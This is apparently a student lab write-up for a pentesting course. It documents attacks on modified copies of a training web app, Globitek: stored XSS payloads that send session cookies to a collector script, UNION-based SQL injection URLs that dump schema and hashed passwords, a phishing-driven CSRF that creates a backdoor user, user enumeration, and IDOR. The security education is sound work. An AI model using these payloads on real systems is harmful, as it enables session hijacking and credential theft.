# Week-8-Pentesting-Live-Targets
## Objective
*Discover and Demonstrate proof-of-concepts for at least two and up exploits of live targets, each of which is a slightly modified version of the same web application, Globitek*

### Time Spent
*16 hrs*

## Report
### Blue Target
#### Session Hijacking

Details:
- Type of attack: XSS, Session Hijacking/Fixation

Demonstration:
<img src="https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/img/blue_hijacking.gif" width="800">

Steps to duplicate issue:
- Login with staff account
- Click on Countries, States, & Territories and Select "Show" for the United States
- Select a State and edit the state and inject malicious XSS code into Position field
  - ```<script>alert(document.location="http://localhost:8000/php/?c="+document.cookie</script>```
  - In the background, a php script picks up the cookie, script here: [cookie.php](https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/scripts/cookie.php)
- From here, a user can read the file and use it to set their own phpsessid
- Refresh the page on the user that puts the phpsessid and automatically login with no required credentials


#### SQL Injection

Details:
- Type of attack: SQLi
- Get Database, Tables, Column Names, and Fields of all tables, including user hashed passwords

Demostration: 
<img src="https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/img/blue_sqli.gif" width="800">

Steps to duplicate issue:
- Login with staff account
- Go to Salespeople and select a user by clicking "Show"
- Inject into the URL bar, or using a tool
- Different queries apply (many more exist obviously): 
  - ```https://url/blue/public/staff/salespeople/show.php?id=' UNION SELECT 1, session_user(), version(), database(), 5--'```
  - ```https://url/blue/public/staff/salespeople/show.php?id=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'globitek_blue```
  - ```https://url/blue/public/staff/salespeople/show.php?id=' UNION SELECT 0, first_name, username, hashed_password, id FROM users WHERE first_name != '```
- Eventually, you can get a ton of information and project even users' hashed passwords
  

### Green Target
#### URL Cookie (PHPSESSID) Stealing / DOM Redirect

Details:
- Type of attack: Stored XSS, DOM Object Redirect
- Use XSS to force a redirect to a malicious site (such as a cookie stealing site)

Demonstration:
<img src="https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/img/green_url_redirect_cookie_stealer.gif" width="800">

Steps to duplicate issue:
- Go to the Contact Form
- Inject into the From field the following:
  - ```<script>var redirect=document.createElement("audio"); redirect.src="http://localhost:8000/php?c="+document.cookie; document.getElementById("menu").appendChild(redirect);</script>```
  - The inject attaches to the feedback page waiting for it to be triggered
- A staff logs in and checks feedback, it does not rouse attention if done correct
  - In the background, [cookie.php](https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/scripts/cookie.php) does some work and steals the cookie, writing it to a file for future use on the malicious site

#### User Enumeration

Details:
- Type of attack: User Enumeration

Demonstration:
<img src="https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/img/green_user_enumeration.gif" width="800">

Steps to duplicate issue:
- Go to login as staff
- Enter non-existing user
  - Will come up with "Log in was unsuccessful" **not** in bold
- Enter existing user
  - Will come up with "Log in was unsuccessful" in **bold**
- Inspect page and see different span classes used


### Red Target
#### CSRF User Creation from Non-Staff Page

Details:
- Type of attack: CSRF

Demonstration: 
<img src="https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/img/red_csrf_createuser.gif" width="800">

Steps to duplicate issue:
- Go to feedback and do a "phishing" attack to be inconspicuous
  - Leave a URL for the staffer to look at, the more legit it looks, the more likely they are to click it
- Staff logs in and checks feedback and visits the malicious URL
  - Staff sees the page but is not aware of the malicious activity within the URL visited as it looks legitimate on the surface
  - Beneath the surface, the page is running a post request and creating a user on the staffer's site, unaware of the "backdoor" created by the attacker
- New user is created via this script: [createuser.php](https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/scripts/createuser.php)

#### IDOR

Details:
- Type of attack: IDOR
- Use BurpSuite to go through ids and find hidden users

Demonstration:
<img src="https://github.com/dveleztx/Week-8-Pentesting-Live-Targets/blob/master/img/red_idor.gif" width="800">

Steps to duplicate issue:
- User clicks on the tab "Find a Salesperson", then selects a salesman/saleswoman
- Use BurpSuite to go through IDs to find hidden users
